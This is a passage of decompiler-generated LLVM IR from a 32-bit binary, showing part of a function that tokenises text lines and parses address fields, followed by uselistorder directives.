  %v2_8052029 = inttoptr i32 %v1_8052029 to i32*
  %v3_8052029 = load i32, i32* %v2_8052029, align 4
  store i32 %v3_8052029, i32* %eax.global-to-local, align 4
  store i32 %v3_8052029, i32* %arg5, align 4
  %v0_805202e = load i32, i32* %edx.global-to-local, align 4
  %v1_805202e = add i32 %v0_805202e, 8
  %v2_805202e = inttoptr i32 %v1_805202e to i32*
  store i32 2, i32* %v2_805202e, align 4
  %v0_8052035 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052035 = add i32 %v0_8052035, 12
  %v2_8052035 = inttoptr i32 %v1_8052035 to i32*
  store i32 4, i32* %v2_8052035, align 4
  br label %dec_label_pc_805206e

dec_label_pc_8052042:                             ; preds = %dec_label_pc_805219e
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_805204a = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_805204a, align 4
  %v0_805204c = load i32, i32* %edx.global-to-local, align 4
  %v1_805204c = add i32 %v0_805204c, 4
  %v2_805204c = inttoptr i32 %v1_805204c to i32*
  store i32 0, i32* %v2_805204c, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8052057 = load i32, i32* @ebx, align 4
  %v1_8052057 = add i32 %v0_8052057, 4
  %v2_8052057 = inttoptr i32 %v1_8052057 to i32*
  %v3_8052057 = load i32, i32* %v2_8052057, align 4
  store i32 %v3_8052057, i32* %eax.global-to-local, align 4
  store i32 %v3_8052057, i32* %arg5, align 4
  %v0_805205c = load i32, i32* %edx.global-to-local, align 4
  %v1_805205c = add i32 %v0_805205c, 8
  %v2_805205c = inttoptr i32 %v1_805205c to i32*
  store i32 10, i32* %v2_805205c, align 4
  %v0_8052063 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052063 = add i32 %v0_8052063, 12
  %v2_8052063 = inttoptr i32 %v1_8052063 to i32*
  store i32 16, i32* %v2_8052063, align 4
  br label %dec_label_pc_805206e

dec_label_pc_805206e:                             ; preds = %dec_label_pc_8052015, %dec_label_pc_8052042
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8052015 ], [ %stack_var_-32.0, %dec_label_pc_8052042 ]
  %v1_805206e = load i32, i32* %edx.global-to-local, align 4
  %v2_805206e = add i32 %v1_805206e, 16
  %v3_805206e = inttoptr i32 %v2_805206e to i32*
  store i32 %storemerge, i32* %v3_805206e, align 4
  %v0_8052071 = load i32, i32* @ebx, align 4
  %v1_8052071 = add i32 %v0_8052071, 8
  %v1_8052074 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052074 = add i32 %v1_8052074, 4
  %v3_8052074 = inttoptr i32 %v2_8052074 to i32*
  store i32 %v1_8052071, i32* %v3_8052074, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_805207b = load i32, i32* %edx.global-to-local, align 4
  %v2_805207b = inttoptr i32 %arg8 to i32*
  store i32 %v0_805207b, i32* %v2_805207b, align 4
  br label %dec_label_pc_80521d9

dec_label_pc_805208a:                             ; preds = %dec_label_pc_8051f5e
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_80520a9

dec_label_pc_80520a9:                             ; preds = %dec_label_pc_8051fdb, %dec_label_pc_805208a
  %v1_80520ad.pre-phi = phi i32* [ %v1_8051f7a, %dec_label_pc_8051fdb ], [ %.pre, %dec_label_pc_805208a ]
  %stack_var_-32.0 = phi i32 [ %v1_8051fa7, %dec_label_pc_8051fdb ], [ 0, %dec_label_pc_805208a ]
  %stack_var_-36.0 = phi i32 [ %v1_8051f5e, %dec_label_pc_8051fdb ], [ 0, %dec_label_pc_805208a ]
  %stack_var_-40.0 = phi i32 [ %v0_8051fe6, %dec_label_pc_8051fdb ], [ 0, %dec_label_pc_805208a ]
  %stack_var_4.0 = phi i32 [ %v0_8051fce, %dec_label_pc_8051fdb ], [ %arg1, %dec_label_pc_805208a ]
  %stack_var_-20.0 = phi i8* [ %v5_8051ff2, %dec_label_pc_8051fdb ], [ %v5_8051f64, %dec_label_pc_805208a ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_80520ad.pre-phi, align 4
  %v4_80521c5 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_8052162 = inttoptr i32 %arg2 to i8*
  %v0_80521bf120127 = load i32, i32* @edx, align 4
  %v3_80521c9121128 = call i32 @function_804cbf4(i32 %v4_80521c5, i32 %stack_var_4.0, i32 %v0_80521bf120127)
  store i32 %v3_80521c9121128, i32* @eax, align 4
  %v1_80521d1122129 = icmp eq i32 %v3_80521c9121128, 0
  %v1_80521d3123130 = icmp eq i1 %v1_80521d1122129, false
  br i1 %v1_80521d3123130, label %dec_label_pc_80520c0.lr.ph.lr.ph, label %dec_label_pc_80521d9

dec_label_pc_80520c0.lr.ph.lr.ph:                 ; preds = %dec_label_pc_80520a9
  %v12_8052197 = icmp eq i32 %arg3, 10
  %v12_8052175 = icmp eq i32 %arg3, 2
  %v12_805213c = icmp eq i32 %arg4, 2
  %v1_8052141 = icmp eq i1 %v12_805213c, false
  %v1_805217a = icmp eq i1 %v12_8052175, false
  %v1_805219c = icmp eq i1 %v12_8052197, false
  br label %dec_label_pc_80520c0.lr.ph

dec_label_pc_80520c0.lr.ph:                       ; preds = %dec_label_pc_80520c0.lr.ph.lr.ph, %dec_label_pc_80521bf.outer.backedge
  %v3_80521c9121132 = phi i32 [ %v3_80521c9121128, %dec_label_pc_80520c0.lr.ph.lr.ph ], [ %v3_80521c9121, %dec_label_pc_80521bf.outer.backedge ]
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_80520c0.lr.ph.lr.ph ], [ 2, %dec_label_pc_80521bf.outer.backedge ]
  br label %dec_label_pc_80520c0

dec_label_pc_80520c0:                             ; preds = %dec_label_pc_80520c0.lr.ph, %dec_label_pc_80521bf.backedge
  %v3_80521c9124 = phi i32 [ %v3_80521c9121132, %dec_label_pc_80520c0.lr.ph ], [ %v3_80521c9, %dec_label_pc_80521bf.backedge ]
  %v5_80520c8 = call i32 @function_80522c0(i8* %stack_var_-20.0, i32 35, i32 %v3_80521c9124, i32 %v3_80521c9124)
  store i32 %v5_80520c8, i32* @eax, align 4
  %v1_80520d0 = icmp eq i32 %v5_80520c8, 0
  br i1 %v1_80520d0, label %dec_label_pc_80520d7, label %dec_label_pc_80520d4

dec_label_pc_80520d4:                             ; preds = %dec_label_pc_80520c0
  %v1_80520d4 = inttoptr i32 %v5_80520c8 to i8*
  store i8 0, i8* %v1_80520d4, align 1
  br label %dec_label_pc_80520d7

dec_label_pc_80520d7:                             ; preds = %dec_label_pc_80520c0, %dec_label_pc_80520d4
  store i32 %v4_80521c5, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805211732 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805211733 = icmp eq i8 %v2_805211732, 0
  %v1_805211a39 = icmp eq i1 %v3_805211733, false
  br i1 %v1_805211a39, label %dec_label_pc_80520e3.preheader.preheader, label %dec_label_pc_805211c

dec_label_pc_80520e3.preheader.preheader:         ; preds = %dec_label_pc_80520d7
  %v4_80520e397.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80520e3.preheader

dec_label_pc_80520df:                             ; preds = %dec_label_pc_80520e9
  store i8 0, i8* %v1_80520e3102, align 1
  %v0_80520e2 = load i32, i32* @ecx, align 4
  %v1_80520e2 = add i32 %v0_80520e2, 1
  store i32 %v1_80520e2, i32* @ecx, align 4
  %v1_80520e3 = inttoptr i32 %v1_80520e2 to i8*
  %v2_80520e3 = load i8, i8* %v1_80520e3, align 1
  %v3_80520e3 = zext i8 %v2_80520e3 to i32
  %v4_80520e3 = load i32, i32* %eax.global-to-local, align 4
  %v5_80520e3 = and i32 %v4_80520e3, -256
  %v6_80520e3 = or i32 %v5_80520e3, %v3_80520e3
  store i32 %v6_80520e3, i32* @eax, align 4
  %v4_80520e5 = icmp eq i8 %v2_80520e3, 0
  br i1 %v4_80520e5, label %dec_label_pc_80520e3.dec_label_pc_805211c.loopexit_crit_edge, label %dec_label_pc_80520e9

dec_label_pc_80520e9:                             ; preds = %dec_label_pc_80520e3.preheader, %dec_label_pc_80520df
  %v2_80520e3103 = phi i8 [ %v2_80520e3, %dec_label_pc_80520df ], [ %v2_80520e395, %dec_label_pc_80520e3.preheader ]
  %v1_80520e3102 = phi i8* [ %v1_80520e3, %dec_label_pc_80520df ], [ %v1_80520e394, %dec_label_pc_80520e3.preheader ]
  %v0_80520df101 = phi i32 [ %v1_80520e2, %dec_label_pc_80520df ], [ %v0_80520e347, %dec_label_pc_80520e3.preheader ]
  %v2_80520e9 = sext i8 %v2_80520e3103 to i32
  store i32 %v2_80520e9, i32* @edx, align 4
  %v0_80520ec = load i32, i32* @global_var_8056080, align 128
  store i32 %v0_80520ec, i32* %eax.global-to-local, align 4
  %v2_80520f1 = mul nsw i32 %v2_80520e9, 2
  %v3_80520f1 = add i32 %v0_80520ec, %v2_80520f1
  %v4_80520f1 = inttoptr i32 %v3_80520f1 to i8*
  %v5_80520f1 = load i8, i8* %v4_80520f1, align 1
  %v6_80520f1 = and i8 %v5_80520f1, 32
  %v7_80520f1 = icmp eq i8 %v6_80520f1, 0
  %v1_80520f5 = icmp eq i1 %v7_80520f1, false
  br i1 %v1_80520f5, label %dec_label_pc_80520df, label %dec_label_pc_80520f7

dec_label_pc_80520f7:                             ; preds = %dec_label_pc_80520e9
  %v0_80520f7 = load i32, i32* @edi, align 4
  %v1_80520f7 = add i32 %v0_80520f7, -6
  %v6_80520f7 = sub i32 5, %v0_80520f7
  %v7_80520f7 = and i32 %v6_80520f7, %v0_80520f7
  %v8_80520f7 = icmp slt i32 %v7_80520f7, 0
  %v9_80520f7 = icmp eq i32 %v1_80520f7, 0
  %v10_80520f7 = icmp slt i32 %v1_80520f7, 0
  %v3_80520fa = icmp eq i1 %v10_80520f7, %v8_80520f7
  %v4_80520fa = icmp eq i1 %v9_80520f7, false
  %v5_80520fa = and i1 %v4_80520fa, %v3_80520fa
  br i1 %v5_80520fa, label %dec_label_pc_8052103.preheader, label %dec_label_pc_80520fc

dec_label_pc_80520fc:                             ; preds = %dec_label_pc_80520f7
  %v1_80520fc = load i32, i32* @ebx, align 4
  %v3_80520fc = mul i32 %v0_80520f7, 4
  %v4_80520fc = add i32 %v1_80520fc, %v3_80520fc
  %v5_80520fc = inttoptr i32 %v4_80520fc to i32*
  store i32 %v0_80520df101, i32* %v5_80520fc, align 4
  %v0_80520ff = load i32, i32* @edi, align 4
  %v1_80520ff = add i32 %v0_80520ff, 1
  store i32 %v1_80520ff, i32* @edi, align 4
  %v0_8052103.pre.pre = load i32, i32* @ecx, align 4
  %v4_8052103.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052103.preheader

dec_label_pc_8052103.preheader:                   ; preds = %dec_label_pc_80520fc, %dec_label_pc_80520f7
  %v4_8052103.pre = phi i32 [ %v4_8052103.pre.pre, %dec_label_pc_80520fc ], [ %v0_80520ec, %dec_label_pc_80520f7 ]
  %v0_8052103.pre = phi i32 [ %v0_8052103.pre.pre, %dec_label_pc_80520fc ], [ %v0_80520df101, %dec_label_pc_80520f7 ]
  %v1_805211c52 = phi i32 [ %v1_80520ff, %dec_label_pc_80520fc ], [ %v0_80520f7, %dec_label_pc_80520f7 ]
  %v1_8052103104 = inttoptr i32 %v0_8052103.pre to i8*
  %v2_8052103105 = load i8, i8* %v1_8052103104, align 1
  %v3_8052103106 = zext i8 %v2_8052103105 to i32
  %v5_8052103107 = and i32 %v4_8052103.pre, -256
  %v6_8052103108 = or i32 %v3_8052103106, %v5_8052103107
  store i32 %v6_8052103108, i32* @eax, align 4
  %v4_8052105109 = icmp eq i8 %v2_8052103105, 0
  br i1 %v4_8052105109, label %dec_label_pc_8052117.loopexit, label %dec_label_pc_8052109.lr.ph

dec_label_pc_8052109.lr.ph:                       ; preds = %dec_label_pc_8052103.preheader
  %v0_805210c.pre = load i32, i32* @global_var_8056080, align 128
  br label %dec_label_pc_8052109

dec_label_pc_8052102:                             ; preds = %dec_label_pc_8052109
  %v1_8052102 = add i32 %v0_8052117110, 1
  store i32 %v1_8052102, i32* @ecx, align 4
  %v1_8052103 = inttoptr i32 %v1_8052102 to i8*
  %v2_8052103 = load i8, i8* %v1_8052103, align 1
  %v3_8052103 = zext i8 %v2_8052103 to i32
  %v5_8052103 = and i32 %v0_805210c.pre, -256
  %v6_8052103 = or i32 %v3_8052103, %v5_8052103
  store i32 %v6_8052103, i32* @eax, align 4
  %v4_8052105 = icmp eq i8 %v2_8052103, 0
  br i1 %v4_8052105, label %dec_label_pc_8052117.loopexit, label %dec_label_pc_8052109

dec_label_pc_8052109:                             ; preds = %dec_label_pc_8052109.lr.ph, %dec_label_pc_8052102
  %v2_8052103112 = phi i8 [ %v2_8052103105, %dec_label_pc_8052109.lr.ph ], [ %v2_8052103, %dec_label_pc_8052102 ]
  %v1_8052103111 = phi i8* [ %v1_8052103104, %dec_label_pc_8052109.lr.ph ], [ %v1_8052103, %dec_label_pc_8052102 ]
  %v0_8052117110 = phi i32 [ %v0_8052103.pre, %dec_label_pc_8052109.lr.ph ], [ %v1_8052102, %dec_label_pc_8052102 ]
  %v2_8052109 = sext i8 %v2_8052103112 to i32
  store i32 %v2_8052109, i32* @edx, align 4
  store i32 %v0_805210c.pre, i32* @eax, align 4
  %v2_8052111 = mul nsw i32 %v2_8052109, 2
  %v3_8052111 = add i32 %v0_805210c.pre, %v2_8052111
  %v4_8052111 = inttoptr i32 %v3_8052111 to i8*
  %v5_8052111 = load i8, i8* %v4_8052111, align 1
  %v6_8052111 = and i8 %v5_8052111, 32
  %v7_8052111 = icmp eq i8 %v6_8052111, 0
  br i1 %v7_8052111, label %dec_label_pc_8052102, label %dec_label_pc_8052117.loopexit

dec_label_pc_8052117.loopexit:                    ; preds = %dec_label_pc_8052109, %dec_label_pc_8052102, %dec_label_pc_8052103.preheader
  %v4_80520e397144 = phi i32 [ %v6_8052103108, %dec_label_pc_8052103.preheader ], [ %v6_8052103, %dec_label_pc_8052102 ], [ %v0_805210c.pre, %dec_label_pc_8052109 ]
  %v0_8052117.lcssa = phi i32 [ %v0_8052103.pre, %dec_label_pc_8052103.preheader ], [ %v1_8052102, %dec_label_pc_8052102 ], [ %v0_8052117110, %dec_label_pc_8052109 ]
  %v1_8052103.lcssa = phi i8* [ %v1_8052103104, %dec_label_pc_8052103.preheader ], [ %v1_8052103, %dec_label_pc_8052102 ], [ %v1_8052103111, %dec_label_pc_8052109 ]
  %v2_8052117 = load i8, i8* %v1_8052103.lcssa, align 1
  %v3_8052117 = icmp eq i8 %v2_8052117, 0
  %v1_805211a = icmp eq i1 %v3_8052117, false
  br i1 %v1_805211a, label %dec_label_pc_80520e3.preheader, label %dec_label_pc_805211c

dec_label_pc_80520e3.preheader:                   ; preds = %dec_label_pc_80520e3.preheader.preheader, %dec_label_pc_8052117.loopexit
  %v1_805211c.pre147 = phi i32 [ %v1_805211c52, %dec_label_pc_8052117.loopexit ], [ 0, %dec_label_pc_80520e3.preheader.preheader ]
  %v4_80520e397 = phi i32 [ %v4_80520e397144, %dec_label_pc_8052117.loopexit ], [ %v4_80520e397.pre, %dec_label_pc_80520e3.preheader.preheader ]
  %v0_80520e347 = phi i32 [ %v0_8052117.lcssa, %dec_label_pc_8052117.loopexit ], [ %v4_80521c5, %dec_label_pc_80520e3.preheader.preheader ]
  %v1_80520e394 = inttoptr i32 %v0_80520e347 to i8*
  %v2_80520e395 = load i8, i8* %v1_80520e394, align 1
  %v3_80520e396 = zext i8 %v2_80520e395 to i32
  %v5_80520e398 = and i32 %v4_80520e397, -256
  %v6_80520e399 = or i32 %v5_80520e398, %v3_80520e396
  store i32 %v6_80520e399, i32* @eax, align 4
  %v4_80520e5100 = icmp eq i8 %v2_80520e395, 0
  br i1 %v4_80520e5100, label %dec_label_pc_805211c, label %dec_label_pc_80520e9

dec_label_pc_80520e3.dec_label_pc_805211c.loopexit_crit_edge: ; preds = %dec_label_pc_80520df
  %v1_805211c.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805211c

dec_label_pc_805211c:                             ; preds = %dec_label_pc_8052117.loopexit, %dec_label_pc_80520e3.dec_label_pc_805211c.loopexit_crit_edge, %dec_label_pc_80520e3.preheader, %dec_label_pc_80520d7
  %v1_805211c = phi i32 [ 0, %dec_label_pc_80520d7 ], [ %v1_805211c.pre.pre, %dec_label_pc_80520e3.dec_label_pc_805211c.loopexit_crit_edge ], [ %v1_805211c.pre147, %dec_label_pc_80520e3.preheader ], [ %v1_805211c52, %dec_label_pc_8052117.loopexit ]
  %v0_805211c = load i32, i32* @ebx, align 4
  %v2_805211c = mul i32 %v1_805211c, 4
  %v3_805211c = add i32 %v2_805211c, %v0_805211c
  %v4_805211c = inttoptr i32 %v3_805211c to i32*
  store i32 0, i32* %v4_805211c, align 4
  %v0_8052123 = load i32, i32* @edi, align 4
  %v7_8052126 = icmp sgt i32 %v0_8052123, 1
  br i1 %v7_8052126, label %dec_label_pc_805212c, label %dec_label_pc_80521bf.backedge

dec_label_pc_805212c:                             ; preds = %dec_label_pc_805211c
  br i1 %v12_8051f68, label %dec_label_pc_80521f9, label %dec_label_pc_8052137

dec_label_pc_8052137:                             ; preds = %dec_label_pc_805212c
  store i32 1, i32* @esi, align 4
  br i1 %v1_8052141, label %dec_label_pc_8052159.lr.ph, label %dec_label_pc_8052143

dec_label_pc_8052159.lr.ph:                       ; preds = %dec_label_pc_8052137
  br label %dec_label_pc_8052159

dec_label_pc_8052143:                             ; preds = %dec_label_pc_8052137
  %v0_8052143 = load i32, i32* @eax, align 4
  %v0_8052145 = load i32, i32* @ebx, align 4
  %v1_8052145 = inttoptr i32 %v0_8052145 to i32*
  %v2_8052145 = load i32, i32* %v1_8052145, align 4
  %v5_805214b = call i32 @function_8051620(i8* %v2_8052162, i32 %v2_8052145, i32 %v0_8052143, i32 %v0_8052143)
  store i32 %v5_805214b, i32* %eax.global-to-local, align 4
  %v1_8052153 = icmp eq i32 %v5_805214b, 0
  %v1_8052155 = icmp eq i1 %v1_8052153, false
  br i1 %v1_8052155, label %dec_label_pc_80521bf.backedge, label %dec_label_pc_8052175

dec_label_pc_80521bf.backedge:                    ; preds = %dec_label_pc_805216e, %dec_label_pc_8052143, %dec_label_pc_805211c
  %v0_80521bf = load i32, i32* @edx, align 4
  %v3_80521c9 = call i32 @function_804cbf4(i32 %v4_80521c5, i32 %stack_var_4.0, i32 %v0_80521bf)
  store i32 %v3_80521c9, i32* @eax, align 4
  %v1_80521d1 = icmp eq i32 %v3_80521c9, 0
  %v1_80521d3 = icmp eq i1 %v1_80521d1, false
  br i1 %v1_80521d3, label %dec_label_pc_80520c0, label %dec_label_pc_80521d9

dec_label_pc_8052159:                             ; preds = %dec_label_pc_8052159.lr.ph, %dec_label_pc_805216e
  %v1_805215b119 = phi i32 [ 1, %dec_label_pc_8052159.lr.ph ], [ %v1_805216e, %dec_label_pc_805216e ]
  %v0_805215b = load i32, i32* @ebx, align 4
  %v2_805215b = mul i32 %v1_805215b119, 4
  %v3_805215b = add i32 %v0_805215b, %v2_805215b
  %v4_805215b = inttoptr i32 %v3_805215b to i32*
  %v5_805215b = load i32, i32* %v4_805215b, align 4
  %v3_8052162 = call i32 @function_804d2f4(i8* %v2_8052162, i32 %v5_805215b)
  store i32 %v3_8052162, i32* %eax.global-to-local, align 4
  %v1_805216a = icmp eq i32 %v3_8052162, 0
  br i1 %v1_805216a, label %dec_label_pc_8052175, label %dec_label_pc_805216e

dec_label_pc_805216e:                             ; preds = %dec_label_pc_8052159
  %v0_805216e = load i32, i32* @esi, align 4
  %v1_805216e = add i32 %v0_805216e, 1
  store i32 %v1_805216e, i32* @esi, align 4
  %v1_805216f.pre = load i32, i32* @edi, align 4
  %v5_8052171 = icmp slt i32 %v1_805216e, %v1_805216f.pre
  br i1 %v5_8052171, label %dec_label_pc_8052159, label %dec_label_pc_80521bf.backedge

dec_label_pc_8052175:                             ; preds = %dec_label_pc_8052143, %dec_label_pc_8052159
  br i1 %v1_805217a, label %dec_label_pc_8052197, label %dec_label_pc_805217c

dec_label_pc_805217c:                             ; preds = %dec_label_pc_8052175
  %v0_805217c = load i32, i32* @esi, align 4
  %v3_805217d = load i8*, i8** %stack_var_-44, align 4
  %v4_805217d = ptrtoint i8* %v3_805217d to i32
  %v0_8052181 = load i32, i32* @ebx, align 4
  %v1_8052181 = inttoptr i32 %v0_8052181 to i32*
  %v2_8052181 = load i32, i32* %v1_8052181, align 4
  %v4_8052185 = inttoptr i32 %v2_8052181 to i8*
  %v5_8052185 = call i32 @function_805178e(i32 2, i8* %v4_8052185, i32 %v4_805217d, i32 %v0_805217c)
  store i32 %v5_8052185, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8052185, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8052015, label %dec_label_pc_80521bf.outer.backedge

dec_label_pc_80521bf.outer.backedge:              ; preds = %dec_label_pc_805217c, %dec_label_pc_805219e, %dec_label_pc_8052197
  %v0_80521bf120 = load i32, i32* @edx, align 4
  %v3_80521c9121 = call i32 @function_804cbf4(i32 %v4_80521c5, i32 %stack_var_4.0, i32 %v0_80521bf120)
  store i32 %v3_80521c9121, i32* @eax, align 4
  %v1_80521d1122 = icmp eq i32 %v3_80521c9121, 0
  %v1_80521d3123 = icmp eq i1 %v1_80521d1122, false
  br i1 %v1_80521d3123, label %dec_label_pc_80520c0.lr.ph, label %dec_label_pc_80521d9

dec_label_pc_8052197:                             ; preds = %dec_label_pc_8052175
  br i1 %v1_805219c, label %dec_label_pc_80521bf.outer.backedge, label %dec_label_pc_805219e

dec_label_pc_805219e:                             ; preds = %dec_label_pc_8052197
  %v0_805219e = load i32, i32* @ecx, align 4
  %v0_80521a3 = load i32, i32* @ebx, align 4
  %v1_80521a3 = inttoptr i32 %v0_80521a3 to i32*
  %v2_80521a3 = load i32, i32* %v1_80521a3, align 4
  %v4_80521a7 = inttoptr i32 %v2_80521a3 to i8*
  %v5_80521a7 = call i32 @function_805178e(i32 10, i8* %v4_80521a7, i32 %stack_var_-36.0, i32 %v0_805219e)
  store i32 %v5_80521a7, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_80521a7, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8052042, label %dec_label_pc_80521bf.outer.backedge

dec_label_pc_80521d9:                             ; preds = %dec_label_pc_80521bf.outer.backedge, %dec_label_pc_80520a9, %dec_label_pc_80521bf.backedge, %dec_label_pc_805206e
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805206e ], [ 1, %dec_label_pc_80520a9 ], [ 2, %dec_label_pc_80521bf.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_80521bf.backedge ]
  br i1 %v12_8051f68, label %dec_label_pc_80521f9, label %dec_label_pc_80521e0

dec_label_pc_80521e0:                             ; preds = %dec_label_pc_80521d9
  %v1_80521e7 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_80521e7 = call i32 @function_804b77c(i16* %v1_80521e7)
  store i32 %v2_80521e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80521f9

dec_label_pc_80521f9:                             ; preds = %dec_label_pc_805212c, %dec_label_pc_8051f49, %dec_label_pc_8051f55, %dec_label_pc_8051f73, %dec_label_pc_8051f86, %dec_label_pc_8051f92, %dec_label_pc_8051f9b, %dec_label_pc_8051fc5, %dec_label_pc_80521d9, %dec_label_pc_80521e0, %dec_label_pc_8051ffb
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80521d9 ], [ %stack_var_-28.1, %dec_label_pc_80521e0 ], [ %v2_805200a, %dec_label_pc_8051ffb ], [ 34, %dec_label_pc_8051fc5 ], [ 34, %dec_label_pc_8051f9b ], [ 34, %dec_label_pc_8051f92 ], [ 34, %dec_label_pc_8051f86 ], [ 34, %dec_label_pc_8051f73 ], [ 34, %dec_label_pc_8051f55 ], [ 34, %dec_label_pc_8051f49 ], [ %stack_var_-28.0.ph131, %dec_label_pc_805212c ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8051f34, i32* @ebx, align 4
  store i32 %v0_8051f33, i32* @esi, align 4
  store i32 %v0_8051f32, i32* @edi, align 4
  store i32 %v0_8051f31, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v3_80521c9121, { 1, 2, 0 }
  uselistorder i32 %v1_805216e, { 0, 2, 1 }
  uselistorder i32 %v3_80521c9, { 1, 2, 0 }
  uselistorder i8 %v2_80520e395, { 1, 2, 0 }
  uselistorder i8* %v1_80520e394, { 1, 0 }
  uselistorder i32 %v0_80520e347, { 1, 0 }
  uselistorder i32 %v2_8052109, { 1, 0 }
  uselistorder i32 %v1_8052102, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805210c.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80520f7, { 1, 0 }
  uselistorder i32 %v0_80520f7, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80520e9, { 1, 0 }
  uselistorder i32 %v3_80521c9124, { 1, 0 }
  uselistorder i8* %v2_8052162, { 1, 0 }
  uselistorder i32 %v4_80521c5, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8051f86, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8051f61, { 1, 0 }
  uselistorder i32 %v1_8051f44, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 0, 1, 14, 15, 16 }
  uselistorder i32 (i16*)* @function_804b77c, { 2, 3, 0, 1, 5, 4 }
  uselistorder i32 (i8*, i32)* @function_804d2f4, { 3, 0, 1, 2 }
  uselistorder i32 5, { 10, 12, 13, 14, 0, 9, 4, 5, 11, 6, 15, 16, 7, 1, 2, 17, 3, 8 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 16, 0, 1, 7, 2, 13, 17, 18, 14, 15, 3, 4, 5, 6 }
  uselistorder i32* @global_var_8056080, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 (i32, i32, i32)* @function_804cbf4, { 1, 6, 0, 5, 2, 4, 3 }
  uselistorder i32 10, { 13, 1, 24, 25, 26, 27, 28, 29, 2, 18, 19, 21, 20, 3, 6, 30, 7, 32, 9, 8, 14, 4, 16, 17, 22, 10, 31, 15, 11, 0, 5, 23, 12 }
  uselistorder i32 12, { 37, 38, 39, 0, 40, 16, 26, 49, 54, 18, 17, 4, 41, 5, 6, 7, 8, 9, 10, 11, 50, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 102, 25, 27, 32, 53, 28, 29, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 19, 86, 42, 43, 44, 45, 103, 46, 98, 1, 2, 99, 100, 12, 13, 101, 3, 51, 52, 20, 24, 21, 22, 30, 31, 14, 15, 33, 34, 35, 36, 47, 48, 23 }
  uselistorder i32 80, { 0, 7, 8, 9, 10, 11, 12, 13, 2, 3, 5, 1, 4, 6 }
  uselistorder i32 56, { 3, 14, 4, 5, 6, 7, 8, 1, 10, 9, 11, 2, 0, 15, 12, 13 }
  uselistorder i32 44, { 3, 4, 5, 1, 16, 17, 18, 6, 7, 0, 13, 15, 14, 10, 11, 12, 8, 9, 2 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 1, 2, 14, 15, 3, 16, 17, 18, 19 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 13, 12, 3, 9, 4, 14, 15, 0, 10, 6, 5, 1, 11, 7, 8, 16, 17, 18, 19, 2 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 16, { 48, 47, 5, 49, 50, 14, 2, 51, 15, 89, 99, 100, 52, 53, 54, 55, 56, 57, 64, 58, 59, 60, 61, 62, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 90, 91, 92, 93, 101, 102, 103, 104, 105, 106, 107, 108, 123, 16, 17, 31, 18, 43, 26, 32, 40, 33, 127, 97, 7, 6, 98, 0, 8, 75, 76, 23, 3, 24, 9, 19, 128, 77, 78, 79, 80, 81, 82, 94, 95, 83, 84, 85, 86, 109, 110, 111, 112, 113, 114, 1, 115, 116, 117, 118, 119, 10, 120, 121, 27, 122, 124, 125, 126, 96, 4, 36, 28, 29, 34, 35, 37, 11, 38, 39, 12, 41, 13, 42, 20, 44, 45, 46, 21, 87, 22, 88, 30, 25 }
